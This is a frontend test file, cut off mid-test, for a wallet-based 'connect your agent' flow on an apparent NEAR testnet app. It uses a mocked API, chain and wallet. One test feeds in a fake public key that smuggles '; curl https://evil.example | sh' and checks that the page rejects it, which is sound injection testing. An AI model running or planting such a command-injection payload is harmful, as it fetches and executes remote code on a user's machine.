import {
  AGENT_SETUP_WASM_SHA256,
  base58Encode,
  connectFingerprint,
  implicitAccountOf,
  SIGN_IN_MESSAGE,
  sha256Hex,
} from "@tender/shared";
import { cleanup, configure, render, screen, waitFor, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { afterEach, beforeEach, expect, test, vi } from "vitest";
import { AddAgentView } from "../components/account/AddAgentView";
import { clearApiToken } from "../lib/auth";
import { createWalletStore, type SigningWallet, type WalletStore } from "../lib/wallet";
import { fakeProvider } from "./walletDoubles";

// "Connect your agent", the top of "Add an agent", as a person goes through it: the real hook, the
// real store and the real sign-in, over a wallet that signs a message and sends batches, a fake API
// that makes connect codes and says how they stand, and a fake node that answers the page's reads.
// The agent itself is the test: it attaches its PUBLIC key to the code and registers by changing
// what the API says. vitest.config.ts gives the config http://api.test, http://rpc.test, testnet and
// the contract tender.testnet.

const ALICE = "alice.testnet";
const AGENT = `writer.${ALICE}`;
const CONTRACT = "tender.testnet";
const TOKEN = "tusdc.tender-team.testnet";
const BOND = 5_000_000n;
const CODE = "tc_abcdefghijklmnopqrstuvwxyz";
const ID = "Q0RFRkdISUpLTE1OT1BRUg";
const PUBLIC = "ed25519:6E8sCci9badyRkXb3JoRpBj5p8C6Tw41ELDZoiihKEtp";
/** The implicit account of the agent's key: its own, which the page works out itself. */
const IMPLICIT = implicitAccountOf(PUBLIC) ?? "";
const NONCE = btoa(String.fromCharCode(...Array.from({ length: 32 }, (_, i) => i + 1)));

const holder = vi.hoisted(() => ({ store: undefined as unknown as WalletStore }));
vi.mock("../lib/wallet", async (importOriginal) => {
  const actual = await importOriginal<typeof import("../lib/wallet")>();
  return {
    ...actual,
    useWallet: () => actual.useWalletStore(holder.store),
    useAccountActions: () => actual.accountActionsOf(holder.store),
  };
});

const CONSOLE = ["error", "warn", "log", "info", "debug"] as const;

// A step waits on a poll, then a read of the node, then a render: on a loaded machine that takes
// longer than Testing Library's second.
configure({ asyncUtilTimeout: 4000 });

beforeEach(() => {
  for (const method of CONSOLE) vi.spyOn(console, method).mockImplementation(() => {});
});

afterEach(() => {
  vi.unstubAllGlobals();
  vi.restoreAllMocks();
  clearApiToken();
  sessionStorage.clear();
  localStorage.clear();
});

const json = (body: unknown, status = 200) => new Response(JSON.stringify(body), { status });

/** The API, the chain and the agent, as the test moves them. */
interface World {
  /** Accounts on the chain, with their full-access keys. */
  accounts: Map<string, string[]>;
  /** Accounts with a storage balance with Tender. */
  storage: Set<string>;
  /** Vault balances of the bond's token. */
  vault: Map<string, bigint>;
  /** Wallet balances of the bond's token. */
  wallet: Map<string, bigint>;
  /** The contract's config view. */
  config: Record<string, unknown>;
  /** The code, once made, as the API holds it. */
  code: {
    name: string;
    attached: string | null;
    expired: boolean;
    agent: null | { status: string };
    registeredAt: string | null;
    contestedAt?: string | null;
    /** Which account the agent gets, as the API records it. */
    kind?: "sub_account" | "implicit";
  } | null;
  /** The index's agents, by account (`GET /v1/agents/:account`), with their status. */
  agents: Map<string, string>;
  /** How many of the next account creations the network fails, the wallet going on after them. */
  failCreates: number;
  /** How many codes were made. */
  made: number;
  /** A key the agent attaches at once, before the page's first read of the code. */
  attachOnCreate?: string;
  /** How many of the next deposits of the bond the token fails. */
  failDeposits: number;
  /** A refusal for the next code, in place of a code. */
  refuseCode: Response | null;
  /** What `GET /v1/connect/codes/:id` answers with in place of the state, while set. */
  readStatus: number | null;
  /** A state that lies: another fingerprint, or another account, than the code's. */
  lie?: { fingerprint?: string; account?: string; publicKey?: string };
  /** The account the API names once the code is moved to the implicit account, if not the key's. */
  lieImplicit?: string;
  /** The status the API answers the move to the implicit account with, in place of making it. */
  refuseImplicit?: number;
  /** `METHOD /path` of every request to the API, and `RPC <what> <account>` of every read. */
  requests: string[];
  /** Every request body, as text. */
  bodies: string[];
  /** The Authorization of each request to the connect routes. */
  authorizations: (string | null)[];
}

function world(): World {
  return {
    accounts: new Map([[ALICE, []]]),
    storage: new Set(),
    vault: new Map(),
    wallet: new Map([[ALICE, 20_000_000n]]),
    config: {
      owner: CONTRACT,
      agent_bond_token: TOKEN,
      agent_bond_amount: BOND.toString(),
      agent_bond_cooldown_secs: "604800",
    },
    code: null,
    made: 0,
    failDeposits: 0,
    agents: new Map(),
    failCreates: 0,
    refuseCode: null,
    readStatus: null,
    requests: [],
    bodies: [],
    authorizations: [],
  };
}

const rpcMissing = (name: string) =>
  json({
    jsonrpc: "2.0",
    id: "x",
    error: { name: "HANDLER_ERROR", cause: { name, info: {} }, data: "does not exist" },
  });
const rpcValue = (value: unknown) =>
  json({
    jsonrpc: "2.0",
    id: "x",
    result: { result: [...new TextEncoder().encode(JSON.stringify(value))], logs: [] },
  });

/** `fetch`, answered from `state`. */
function serve(state: World): void {
  vi.stubGlobal("fetch", async (input: RequestInfo | URL, init: RequestInit = {}) => {
    const url = new URL(String(input));
    if (init.body !== undefined) state.bodies.push(String(init.body));
    if (url.origin === "http://rpc.test") {
      const { params } = JSON.parse(String(init.body)) as { params: Record<string, string> };
      const account = params.account_id ?? "";
      if (params.request_type === "view_account") {
        state.requests.push(`RPC view_account ${account}`);
        return state.accounts.has(account)
          ? json({ jsonrpc: "2.0", id: "x", result: { amount: "1" } })
          : rpcMissing("UNKNOWN_ACCOUNT");
      }
      if (params.request_type === "view_access_key_list") {
        state.requests.push(`RPC view_access_key_list ${account}`);
        if (!state.accounts.has(account)) return rpcMissing("UNKNOWN_ACCOUNT");
        return json({
          jsonrpc: "2.0",
          id: "x",
          result: {
            keys: (state.accounts.get(account) ?? []).map((key) => ({
              public_key: key,
              access_key: { nonce: 0, permission: "FullAccess" },
            })),
          },
        });
      }
      if (params.request_type === "view_access_key") {
        return (state.accounts.get(account) ?? []).includes(params.public_key ?? "")
          ? json({ jsonrpc: "2.0", id: "x", result: { nonce: 0, permission: "FullAccess" } })
          : rpcMissing("UNKNOWN_ACCESS_KEY");
      }
      const args = JSON.parse(atob(params.args_base64 ?? "") || "{}") as { account_id?: string };
      const who = args.account_id ?? "";
      state.requests.push(`RPC ${params.method_name} ${who}`);
      switch (params.method_name) {
        case "get_config":
          return rpcValue(state.config);
        case "storage_balance_of":
          return rpcValue(
            state.storage.has(who)
              ? { total: "20000000000000000000000", available: "17000000000000000000000" }
              : null,
          );
        case "balance_of":
          return rpcValue((state.vault.get(who) ?? 0n).toString());
        case "ft_balance_of":
          return rpcValue((state.wallet.get(who) ?? 0n).toString());
        default:
          return rpcValue(null);
      }
    }
    const method = init.method ?? "GET";
    state.requests.push(`${method} ${url.pathname}`);
    if (url.pathname === "/v1/auth/challenge") {
      return json({
        nonce: NONCE,
        message: SIGN_IN_MESSAGE,
        recipient: "http://api.test",
        expires_at: "2099-01-01T00:00:00.000Z",
      });
    }
    if (url.pathname === "/v1/auth/verify") {
      return json({
        token: "t".repeat(43),
        expires_at: "2099-01-01T00:00:00.000Z",
        key_kind: "full_access",
      });
    }
    const agentPath = /^\/v1\/agents\/([^/]+)$/.exec(url.pathname);
    if (agentPath !== null) {
      const status = state.agents.get(agentPath[1] ?? "");
      if (status === undefined) return json({ error: "not_found", message: "no such agent" }, 404);
      return json({
        agent: {
          account: agentPath[1],
          asp: ALICE,
          name: null,
          tags: [],
          profile_uri: "tender://agent/writer",
          profile_hash: "a".repeat(64),
          registered_height: "1",
          entries: 0,
          reveals: 0,
          wins: 0,
          earned: {},
          picks_made: 0,
          voids_after_reveals: 0,
          is_team: false,
          status,
          bond_token: TOKEN,
          bond_amount: BOND.toString(),
          claimable_at: null,
        },
        recent_entries: [],
      });
    }
    if (url.pathname.startsWith("/v1/connect/")) {
      state.authorizations.push(new Headers(init.headers).get("Authorization"));
    }
    if (url.pathname === "/v1/connect/codes" && method === "POST") {
      if (state.refuseCode !== null) return state.refuseCode;
      const { name } = JSON.parse(String(init.body)) as { name: string };
      state.made++;
      state.code = {
        name,
        attached: state.attachOnCreate ?? null,
        expired: false,
        agent: null,
        registeredAt: null,
      };
      return json({
        id: ID,
        code: CODE,
        owner: ALICE,
        name,
        account_id: `${name}.${ALICE}`,
        expires_at: new Date(Date.now() + 30 * 60_000).toISOString(),
      });
    }
    const implicitPath = `/v1/connect/codes/${ID}/implicit`;
    if (url.pathname === implicitPath && method === "POST" && state.code !== null) {
      if (state.refuseImplicit !== undefined) {
        return json({ error: "contested", message: "a server's words" }, state.refuseImplicit);
      }
      state.code.kind = "implicit";
    }
    if (
      (url.pathname === `/v1/connect/codes/${ID}` || url.pathname === implicitPath) &&
      state.code !== null
    ) {
      if (state.readStatus !== null) {
        return json({ error: "unauthorized", message: "sign in" }, state.readStatus);
      }
      const { code } = state;
      const implicit = code.kind === "implicit";
      return json({
        id: ID,
        owner: ALICE,
        name: code.name,
        account_id: implicit
          ? (state.lieImplicit ?? implicitAccountOf(code.attached ?? "") ?? "")
          : (state.lie?.account ?? `${code.name}.${ALICE}`),
        account_kind: code.kind ?? "sub_account",
        state: code.contestedAt
          ? "contested"
          : code.registeredAt
            ? "registered"
            : code.attached
              ? "attached"
              : code.expired
                ? "expired"
                : "waiting",
        created_at: "2026-11-04T10:00:00.000Z",
        expires_at: "2026-11-04T10:30:00.000Z",
        public_key: state.lie?.publicKey ?? code.attached,
        fingerprint:
          code.attached === null
            ? null
            : (state.lie?.fingerprint ?? connectFingerprint(code.attached)),
        attached_at: code.attached === null ? null : "2026-11-04T10:01:00.000Z",
        registered_at: code.registeredAt,
        contested_at: code.contestedAt ?? null,
        agent:
          code.agent === null
            ? null
            : { status: code.agent.status, bond_token: TOKEN, bond_amount: BOND.toString() },
      });
    }
    return json({ error: "not_found", message: "no such route" }, 404);
  });
}

/** A transaction the wallet was asked to send, as it got it. */
interface Sent {
  receiverId: string;
  actions: Array<{ type: string; params?: Record<string, unknown> }>;
}

/**
 * Alice's wallet, which signs a message (the sign-in) and runs what it is sent on `state`: an
 * account with the key its setup call adds, the implicit account of a key that a transfer creates,
 * Tender's storage for the account named, and a deposit of the bond token into the vault it names,
 * once that account has storage (`failDeposits` of them fail). `accountActions: false` is a wallet
 * whose manifest says it can't send whole transactions; `signMessage: false` can't sign in;
 * `refuseNewAccounts` throws for a batch that creates an account, as a wallet that blocks setting up
 * a key does (`refuseTransfers` for one that sends NEAR, too).
 */
function aliceWallet(
  state: World,
  options: {
    accountActions?: boolean;
    signMessage?: boolean;
    refuseNewAccounts?: boolean;
    refuseTransfers?: boolean;
  } = {},
) {
  const batches: Sent[][] = [];
  const refused: Sent[][] = [];
  const signed: string[] = [];
  const wallet: SigningWallet = {
    manifest: {
      features: {
        signMessage: options.signMessage ?? true,
        signAndSendTransactions: options.accountActions ?? true,
      },
    },
    async signAndSendTransactions({ transactions }) {
      const batch = transactions as unknown as Sent[];
      const has = (type: string) =>
        batch.some((tx) => tx.actions.some((action) => action.type === type));
      if (
        (options.refuseNewAccounts && has("CreateAccount")) ||
        (options.refuseTransfers && has("Transfer"))
      ) {
        refused.push(batch);
        throw new Error("Full access key request blocked");
      }
      batches.push(batch);
      const outcomes: unknown[] = [];
      for (const [index, transaction] of batch.entries()) {
        let failed = false;
        // An account creation the network fails: nothing of its transaction happens, and this
        // wallet goes on with the next transactions, as some do.
        const creates = transaction.actions.some((action) => action.type === "CreateAccount");
        let goesOn = false;
        if (creates && state.failCreates > 0) {
          state.failCreates--;
          failed = true;
          goesOn = true;
        }
        for (const action of failed ? [] : transaction.actions) {
          const params = action.params ?? {};
          if (action.type === "CreateAccount") state.accounts.set(transaction.receiverId, []);
          // A transfer that creates the implicit account of the key the agent attached.
          const attachedKey = state.code?.attached ?? "";
          if (
            action.type === "Transfer" &&
            !state.accounts.has(transaction.receiverId) &&
            transaction.receiverId === implicitAccountOf(attachedKey)
          ) {
            state.accounts.set(transaction.receiverId, [attachedKey]);
          }
          if (action.type !== "FunctionCall") continue;
          const args = params.args as Record<string, string>;
          // The setup code adds the key it is called with, to the account it is on.
          if (params.methodName === "setup") {
            const keys = state.accounts.get(transaction.receiverId) ?? [];
            state.accounts.set(transaction.receiverId, [...keys, String(args.public_key)]);
          }
          if (params.methodName === "storage_deposit") state.storage.add(String(args.account_id));
          if (params.methodName === "ft_transfer_call") {
            const beneficiary = (JSON.parse(args.msg ?? "{}") as { for: string }).for;
            const amount = BigInt(args.amount ?? "0");
            if (state.failDeposits > 0 || (state.wallet.get(ALICE) ?? 0n) < amount) {
              state.failDeposits = Math.max(0, state.failDeposits - 1);
              failed = true;
            } else if (state.storage.has(beneficiary)) {
              state.wallet.set(ALICE, (state.wallet.get(ALICE) ?? 0n) - amount);
              state.vault.set(beneficiary, (state.vault.get(beneficiary) ?? 0n) + amount);
            }
          }
        }
        const status = failed
          ? {
              Failure: {
                ActionError: { kind: { FunctionCallError: { ExecutionError: "E_TOKEN" } } },
              },
            }
          : { SuccessValue: "" };
        outcomes.push({
          status,
          transaction: { hash: `tx${batches.length}-${index}` },
          receipts_outcome: [
            { id: `r${index}`, outcome: { executor_id: transaction.receiverId, logs: [], status } },
          ],
        });
        if (failed && !goesOn) break;
      }
      return outcomes;
    },
    async signMessage({ message }) {
      signed.push(message);
      return {
        accountId: ALICE,
        publicKey: `ed25519:${"1".repeat(44)}`,
        signature: "c2lnbmF0dXJl",
      };
    },
  };
  return { session: { wallet, accountId: ALICE }, batches, refused, signed };
}

function open(state: World, options: Parameters<typeof aliceWallet>[1] & { pollMs?: number } = {}) {
  serve(state);
  const alice = aliceWallet(state, options);
  holder.store = createWalletStore(async () => fakeProvider(alice.session, { restored: true }));
  render(<AddAgentView pollMs={options.pollMs ?? 20} />);
  return { ...alice, user: userEvent.setup() };
}

const step = (n: number) => screen.getByTestId(`connect-step-${n}`);
const nameField = async () =>
  within(await screen.findByTestId("connect-step-1")).getByLabelText("Account name");

/** Types the name, waits for the chain to say it is free, and gets a code. */
async function getCode(user: ReturnType<typeof userEvent.setup>, name = "writer") {
  await user.type(await nameField(), name);
  await within(step(1)).findByText(`${name}.${ALICE} is free.`);
  await user.click(within(step(1)).getByRole("button", { name: "Get a connect code" }));
  await waitFor(() => expect(step(2).dataset.open).toBe("true"));
}

/** The agent attaches its key, as `pnpm agent:connect` does through the API. */
function agentAttaches(state: World, key = PUBLIC) {
  if (state.code === null) throw new Error("no code yet");
  state.code.attached = key;
}

test("the_page_leads_with_one_paste_and_one_approval_and_gets_a_code_with_one_signature", async () => {
  const state = world();
  const { user, signed, batches } = open(state);
  expect(screen.getByRole("banner").textContent).toMatch(
    /One paste where your agent runs, and one approval in your wallet/,
  );
  await nameField();
  // The steps by hand are folded away.
  expect(screen.queryByLabelText("The public key it printed")).toBeNull();
  expect(
    screen.getByRole("button", { name: "Advanced: set up by hand" }).getAttribute("aria-expanded"),
  ).toBe("false");
  expect(step(1).textContent).toContain("Your wallet signs a message to sign you in to Tender");

  await getCode(user);

  // One message signed (the sign-in), no transaction, and the code was asked for with the token.
  expect(signed).toEqual([SIGN_IN_MESSAGE]);
  expect(batches).toEqual([]);
  expect(
    state.requests.filter((line) => !line.startsWith("RPC") && !line.startsWith("GET")),
  ).toEqual(["POST /v1/auth/challenge", "POST /v1/auth/verify", "POST /v1/connect/codes"]);
  expect(state.authorizations[0]).toBe(`Bearer ${"t".repeat(43)}`);
  expect(state.bodies).toContain(JSON.stringify({ name: "writer" }));
  expect(step(1).dataset.done).toBe("true");
  expect(screen.getByTestId("connect-name-state").textContent).toBe(`The code is for ${AGENT}.`);

  // The one thing to paste: the command, or the sentence for an agent with the MCP server.
  expect(screen.getByTestId("connect-command").textContent).toBe(
    `$ pnpm agent:connect ${CODE} --api http://api.test`,
  );
  expect(screen.getByTestId("connect-sentence").textContent).toBe(
    `Connect to Tender with code ${CODE}`,
  );
  expect(screen.getByTestId("connect-waiting").textContent).toMatch(
    /Waiting for your agent to connect\. .*The code works once, for 30 more minutes\./,
  );
  expect(step(3).dataset.open).toBe("false");
});

test("the_attached_key_is_shown_with_its_fingerprint_and_a_warning_before_anything_is_signed", async () => {
  const state = world();
  const { user, batches } = open(state);
  await getCode(user);
  agentAttaches(state);

  await waitFor(() => expect(step(3).dataset.open).toBe("true"));
  expect(step(2).dataset.done).toBe("true");
  expect(screen.getByTestId("connect-ready").textContent).toBe(`Your agent is ready: ${AGENT}`);
  expect(screen.getByTestId("connect-fingerprint").textContent).toBe(connectFingerprint(PUBLIC));
  expect(step(3).textContent).toContain(PUBLIC);
  expect(screen.getByTestId("connect-warning").textContent).toMatch(
    /Press Create agent only if it is this one\. If it printed another, or an error, someone else has this code/,
  );
  expect((await screen.findByTestId("connect-bond")).textContent).toBe("5.00 tUSDC");
  await screen.findByRole("button", { name: "Create agent" });
  expect(batches).toEqual([]);
});

test("create_agent_is_one_approval_that_creates_the_account_and_pays_its_storage_and_bond", async () => {
  const state = world();
  const { user, batches } = open(state);
  await getCode(user);
  agentAttaches(state);
  const create = await screen.findByRole("button", { name: "Create agent" });
  await waitFor(() => expect(state.requests).toContain(`RPC ft_balance_of ${ALICE}`));

  await user.click(create);

  await waitFor(() => expect(step(4).dataset.open).toBe("true"));
  expect(batches).toEqual([
    [
      {
        receiverId: AGENT,
        actions: [
          { type: "CreateAccount" },
          { type: "Transfer", params: { deposit: "500000000000000000000000" } },
          { type: "DeployContract", params: { code: expect.any(Uint8Array) } },
          {
            type: "FunctionCall",
            params: {
              methodName: "setup",
              args: { public_key: PUBLIC },
              gas: "30000000000000",
              deposit: "0",
            },
          },
        ],
      },
      {
        receiverId: CONTRACT,
        actions: [
          {
            type: "FunctionCall",
            params: {
              methodName: "storage_deposit",
              args: { account_id: AGENT },
              gas: "10000000000000",
              deposit: "20000000000000000000000",
            },
          },
        ],
      },
      {
        receiverId: TOKEN,
        actions: [
          {
            type: "FunctionCall",
            params: {
              methodName: "ft_transfer_call",
              args: { receiver_id: CONTRACT, amount: "5000000", msg: `{"for":"${AGENT}"}` },
              gas: "100000000000000",
              deposit: "1",
            },
          },
        ],
      },
    ],
  ]);
  expect(state.vault.get(AGENT)).toBe(BOND);
  // The code deployed is the setup code of contract/res, and no AddKey is among the actions.
  const deploy = batches[0]?.[0]?.actions[2]?.params?.code;
  expect(deploy instanceof Uint8Array && sha256Hex(deploy)).toBe(AGENT_SETUP_WASM_SHA256);
  expect(JSON.stringify(batches)).not.toContain("AddKey");
  expect(state.accounts.get(AGENT)).toEqual([PUBLIC]);
  expect(screen.queryByTestId("connect-implicit-offer")).toBeNull();

  // The ticks: Created and Funded from the chain; Registered and Active wait on the agent.
  await waitFor(() => expect(screen.getByTestId("tick-funded").dataset.state).toBe("done"));
  expect(screen.getByTestId("tick-created").dataset.state).toBe("done");
  expect(screen.getByTestId("tick-registered").dataset.state).toBe("working");
  expect(screen.getByTestId("tick-registered").textContent).toMatch(
    /Waiting for the agent to register/,
  );
  expect(screen.getByTestId("tick-active").dataset.state).toBe("waiting");

  // The agent registers itself; the index lists it.
  if (state.code !== null) state.code.agent = { status: "active" };
  await waitFor(() => expect(screen.getByTestId("tick-active").dataset.state).toBe("done"));
  expect(screen.getByTestId("tick-registered").dataset.state).toBe("done");
  const done = screen.getByTestId("connect-active");
  expect(done.textContent).toContain(`Your agent is active. ${AGENT} is in the directory.`);
  expect(within(done).getByRole("link", { name: "Open its page" }).getAttribute("href")).toBe(
    `/agents/${AGENT}`,
  );
  expect(step(4).dataset.done).toBe("true");
  expect(batches).toHaveLength(1);
});

test("an_answer_whose_fingerprint_is_not_its_keys_or_whose_account_is_another_is_never_signed", async () => {
  const state = world();
  state.lie = { fingerprint: "0000-0000-0000-0000" };
  const { user, batches } = open(state);
  await getCode(user);
  agentAttaches(state);
  const mismatch = await screen.findByTestId("connect-mismatch");
  expect(mismatch.textContent).toContain("Tender's answer doesn't match what this page asked for");
  // The page shows the fingerprint of the key it would add, not the one the API sent.
  expect(screen.getByTestId("connect-fingerprint").textContent).toBe(connectFingerprint(PUBLIC));
  const create = screen.getByRole("button", { name: "Create agent" });
  expect(create.getAttribute("aria-disabled")).toBe("true");
  await user.click(create);
  expect(batches).toEqual([]);

  state.lie = { account: `other.${ALICE}` };
  await waitFor(() =>
    expect(screen.getByTestId("connect-ready").textContent).toBe(
      `Your agent is ready: other.${ALICE}`,
    ),
  );
  expect(screen.getByTestId("connect-mismatch")).toBeTruthy();
  await user.click(screen.getByRole("button", { name: "Create agent" }));
  expect(batches).toEqual([]);
});

test("a_wallet_short_of_the_bond_is_told_before_anything_is_signed", async () => {
  const state = world();
  state.wallet.set(ALICE, 2_000_000n);
  const { user, batches } = open(state);
  await getCode(user);
  agentAttaches(state);

  const short = await screen.findByTestId("connect-short");
  expect(short.textContent).toMatch(
    /Your wallet holds 2\.00 tUSDC, and the bond is 5\.00 tUSDC\. Add 3\.00 tUSDC to your wallet first\./,
  );
  expect(
    within(short)
      .getByRole("link", { name: "Get test tUSDC on the Wallet page" })
      .getAttribute("href"),
  ).toBe("/wallet");
  const create = screen.getByRole("button", { name: "Create agent" });
  expect(create.getAttribute("aria-disabled")).toBe("true");
  await user.click(create);
  expect(batches).toEqual([]);

  // The person gets the tokens, and checks again.
  state.wallet.set(ALICE, 20_000_000n);
  await user.click(within(short).getByRole("button", { name: "Check again" }));
  await waitFor(() => expect(screen.queryByTestId("connect-short")).toBeNull());
  expect(screen.getByRole("button", { name: "Create agent" }).getAttribute("aria-disabled")).toBe(
    "false",
  );
});

test("a_bond_that_failed_leaves_the_account_created_and_fund_agent_sends_what_is_missing", async () => {
  const state = world();
  state.failDeposits = 1;
  const { user, batches } = open(state);
  await getCode(user);
  agentAttaches(state);
  await user.click(await screen.findByRole("button", { name: "Create agent" }));

  // The account was made and the storage paid; the bond's transaction failed.
  await waitFor(() => expect(step(4).dataset.open).toBe("true"));
  expect(screen.getByTestId("tick-created").dataset.state).toBe("done");
  expect(screen.getByTestId("tick-funded").dataset.state).toBe("wrong");
  expect((await screen.findByTestId("connect-fund-error")).textContent).toBe(
    "The account was created and its storage paid, and paying its bond failed on the network. Check that your wallet holds the bond, then press Fund agent.",
  );
  expect(state.storage.has(AGENT)).toBe(true);
  expect(state.vault.get(AGENT)).toBeUndefined();

  // Fund agent sends only what is missing: the bond, as the storage is in place.
  await user.click(screen.getByRole("button", { name: "Fund agent" }));
  await waitFor(() => expect(screen.getByTestId("tick-funded").dataset.state).toBe("done"));
  expect(batches).toHaveLength(2);
  expect(batches[1]?.map((tx) => tx.receiverId)).toEqual([TOKEN]);
  expect(state.vault.get(AGENT)).toBe(BOND);
});

test("a_wallet_that_cannot_make_accounts_gets_the_near_cli_command_then_funds_with_calls", async () => {
  const state = world();
  const { user, batches } = open(state, { accountActions: false });
  await getCode(user);
  agentAttaches(state);

  const cli = await screen.findByTestId("connect-cli");
  expect(screen.queryByRole("button", { name: "Create agent" })).toBeNull();
  expect(within(cli).getByTestId("connect-cli-command").textContent).toBe(
    `$ near account create-account fund-myself ${AGENT} '0.50 NEAR' use-manually-provided-public-key ${PUBLIC} sign-as ${ALICE} network-config testnet sign-with-keychain send`,
  );

  // The person runs it in a terminal; the page sees the account, and pays for it with calls.
  state.accounts.set(AGENT, [PUBLIC]);
  await user.click(within(cli).getByRole("button", { name: "Check again" }));
  await waitFor(() => expect(step(4).dataset.open).toBe("true"));
  expect(screen.getByTestId("tick-funded").dataset.state).toBe("wrong");
  await user.click(screen.getByRole("button", { name: "Fund agent" }));
  await waitFor(() => expect(screen.getByTestId("tick-funded").dataset.state).toBe("done"));
  expect(batches.map((batch) => batch.map((tx) => tx.receiverId))).toEqual([[CONTRACT, TOKEN]]);
  expect(state.vault.get(AGENT)).toBe(BOND);
});

test("a_code_that_expired_unused_offers_a_new_one", async () => {
  const state = world();
  const { user } = open(state);
  await getCode(user);
  if (state.code !== null) state.code.expired = true;

  const expired = await screen.findByTestId("connect-expired");
  expect(expired.textContent).toContain("This code expired before an agent used it.");
  await user.click(within(expired).getByRole("button", { name: "Get a new code" }));
  await waitFor(() => expect(state.made).toBe(2));
  await waitFor(() => expect(screen.queryByTestId("connect-expired")).toBeNull());
});

test("a_taken_name_is_refused_before_a_code_is_made_and_the_apis_refusal_is_shown_in_its_words", async () => {
  const state = world();
  state.accounts.set(`taken.${ALICE}`, ["ed25519:someone"]);
  const { user } = open(state);
  await user.type(await nameField(), "taken");
  await within(step(1)).findByText(`taken.${ALICE} already exists.`);
  // An account that exists is offered as an agent to finish, and no code is made for it.
  expect(screen.getByTestId("connect-finish-offer").textContent).toContain("No new code is needed");
  expect(within(step(1)).queryByRole("button", { name: "Get a connect code" })).toBeNull();

  await user.clear(await nameField());
  await user.type(await nameField(), "writer");
  await within(step(1)).findByText(`${AGENT} is free.`);
  const ask = within(step(1)).getByRole("button", { name: "Get a connect code" });
  state.refuseCode = json(
    {
      error: "bad_request",
      message: "the body does not fit its schema",
      issues: [
        {
          path: ["name"],
          message: "Use lower case: an account id has no capitals.",
          code: "custom",
        },
      ],
    },
    400,
  );
  await user.click(ask);
  expect((await screen.findByTestId("connect-ask-error")).textContent).toBe(
    "Use lower case: an account id has no capitals.",
  );
  state.refuseCode = json({ error: "rate_limited", message: "too many requests" }, 429);
  await user.click(ask);
  await waitFor(() =>
    expect(screen.getByTestId("connect-ask-error").textContent).toBe(
      "You've asked for a lot of codes in a short time. Try again in a few minutes.",
    ),
  );
  expect(state.made).toBe(0);
});

test("a_wallet_that_cannot_sign_in_is_sent_to_the_steps_by_hand", async () => {
  const state = world();
  const { user } = open(state, { signMessage: false });
  const notice = await screen.findByTestId("connect-cannot-sign");
  expect(notice.textContent).toContain("This wallet can't sign in to Tender");
  expect(within(step(1)).queryByRole("button", { name: "Get a connect code" })).toBeNull();
  await user.click(within(notice).getByRole("button", { name: "Set up by hand" }));
  await screen.findByLabelText("The public key it printed");
  expect(state.requests.filter((line) => line.includes("/v1/"))).toEqual([]);
});

test("a_sign_in_that_ended_is_said_and_signing_in_again_goes_on", async () => {
  const state = world();
  const { user, signed } = open(state);
  await getCode(user);
  state.readStatus = 401;
  const notice = await screen.findByTestId("connect-signed-out");
  expect(notice.textContent).toContain("Your sign-in to Tender has ended");
  state.readStatus = null;
  agentAttaches(state);
  await user.click(within(notice).getByRole("button", { name: "Sign in again" }));
  await waitFor(() => expect(step(3).dataset.open).toBe("true"));
  expect(signed).toHaveLength(2);
});

test("the_page_never_holds_a_private_key_and_sends_the_api_only_the_name", async () => {
  const state = world();
  const { user } = open(state);
  await getCode(user);
  agentAttaches(state);
  await screen.findByRole("button", { name: "Create agent" });
  // No field takes a key, and nothing on the page or in a request is anything but public.
  expect(document.querySelectorAll("input")).toHaveLength(1);
  const toApi = state.bodies.filter((body) => !body.includes('"jsonrpc"'));
  expect(toApi).toEqual([
    expect.stringContaining('"account_id":"alice.testnet"'),
    JSON.stringify({ name: "writer" }),
  ]);
  // The only key the page shows is the public one the agent attached.
  expect(document.body.innerHTML.match(/ed25519:[1-9A-HJ-NP-Za-km-z]+/g) ?? []).toEqual([PUBLIC]);
  for (const storage of [sessionStorage, localStorage]) {
    for (let i = 0; i < storage.length; i++) {
      expect(storage.getItem(storage.key(i) ?? "")).not.toContain(CODE);
    }
  }
});

// ---- Fix round 1 ---------------------------------------------------------------------------------

test("a_lying_public_key_never_reaches_the_near_cli_command", async () => {
  // A wallet that can't make accounts gets a command to run with the person's own keychain: built
  // only from an answer that fits, and from the page's own account.
  const state = world();
  state.lie = { publicKey: `${PUBLIC}; curl https://evil.example | sh` };
  const { user, batches } = open(state, { accountActions: false });
  await getCode(user);
  agentAttaches(state);
  // The answer does not parse, so the page has no key to show and nothing to run.
  await waitFor(() =>
    expect(
      state.requests.filter((r) => r === `GET /v1/connect/codes/${ID}`).length,
    ).toBeGreaterThan(1),
  );
  expect(screen.queryByTestId("connect-cli")).toBeNull();
  expect(screen.queryByTestId("connect-cli-command")).toBeNull();
  expect(document.body.innerHTML).not.toContain("evil.example");
  expect(step(3).dataset.open).toBe("false");

  // A key that is a key, with an account that is not the one asked for: no command either.
  state.lie = { account: `other.${ALICE}` };
  await screen.findByTestId("connect-mismatch");
  expect(screen.queryByTestId("connect-cli")).toBeNull();
  expect(batches).toEqual([]);

  // The same answer, honest: the command, for the page's own account.
  state.lie = undefined;
  const cli = await screen.findByTestId("connect-cli-command");
  expect(cli.textContent).toContain(`create-account fund-myself ${AGENT} '0.50 NEAR'`);
});

test("a_retry_after_the_account_failed_pays_no_second_bond", async () => {
  // The network fails the account; this wallet goes on, and the storage and the bond land for an
  // account that does not exist (Tender takes both). The retry creates the account only.
  const state = world();
  state.failCreates = 1;
  const { user, batches } = open(state);
  await getCode(user);
  agentAttaches(state);
  await user.click(await screen.findByRole("button", { name: "Create agent" }));

  expect((await screen.findByTestId("connect-send-error")).textContent).toBe(
    "The account was not created: that transaction failed on the network. Its storage and its bond did reach Tender, so pressing Create agent again creates the account only. Press Create agent to try again.",
  );
  expect(state.accounts.has(AGENT)).toBe(false);
  expect(state.vault.get(AGENT)).toBe(BOND);
  // The money of this way is on the chain for the sub-account: no separate account is offered, and
  // the page says where the money is.
  expect((await screen.findByTestId("connect-implicit-held")).textContent).toBe(
    `Your bond and storage are waiting for ${AGENT}; they stay there until that account is created. Finish with a wallet that allows the setup step.`,
  );
  expect(screen.queryByTestId("connect-implicit-offer")).toBeNull();
  expect(screen.queryByRole("button", { name: SEPARATE })).toBeNull();

  await user.click(screen.getByRole("button", { name: "Create agent" }));
  await waitFor(() => expect(screen.getByTestId("tick-funded").dataset.state).toBe("done"));
  expect(batches).toHaveLength(2);
  expect(batches[1]?.map((tx) => tx.receiverId)).toEqual([AGENT]);
  // One bond, not two.
  expect(state.vault.get(AGENT)).toBe(BOND);
  expect(state.wallet.get(ALICE)).toBe(20_000_000n - BOND);
});

test("a_contested_code_is_refused_and_the_page_stops_asking", async () => {
